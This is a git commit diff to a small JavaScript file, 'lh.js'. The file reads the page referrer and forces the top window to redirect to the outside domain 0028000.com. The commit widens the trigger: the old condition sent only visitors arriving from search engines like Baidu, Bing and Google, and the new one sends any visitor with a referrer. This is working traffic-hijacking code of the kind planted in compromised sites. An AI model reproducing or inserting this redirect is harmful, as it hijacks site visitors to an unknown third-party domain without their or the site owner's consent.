578ae11bc42d6fafd47a2d68521fcb8e3e85b247
hh3322a <50979223+hh3322a@users.noreply.github.com>
2019-06-13 11:56:09 +0800

    Update lh.js

--- lh.js
+++ lh.js
@@ -1,3 +1,4 @@
 var s=document.referrer;
-if(s.indexOf("baidu")>0 || s.indexOf("sogou")>0 || s.indexOf("soso")>0 ||s.indexOf("sm")>0 ||s.indexOf("uc")>0 ||s.indexOf("bing")>0 ||s.indexOf("yahoo")>0 ||s.indexOf("so")>0 ||s.indexOf("google")>0)
+//if(s.indexOf("baidu")>0 || s.indexOf("sogou")>0 || s.indexOf("soso")>0 ||s.indexOf("sm")>0 ||s.indexOf("uc")>0 ||s.indexOf("bing")>0 ||s.indexOf("yahoo")>0 ||s.indexOf("so")>0 ||s.indexOf("google")>0)
+if(s.length>0)
 window.top.location.href="https://0028000.com";
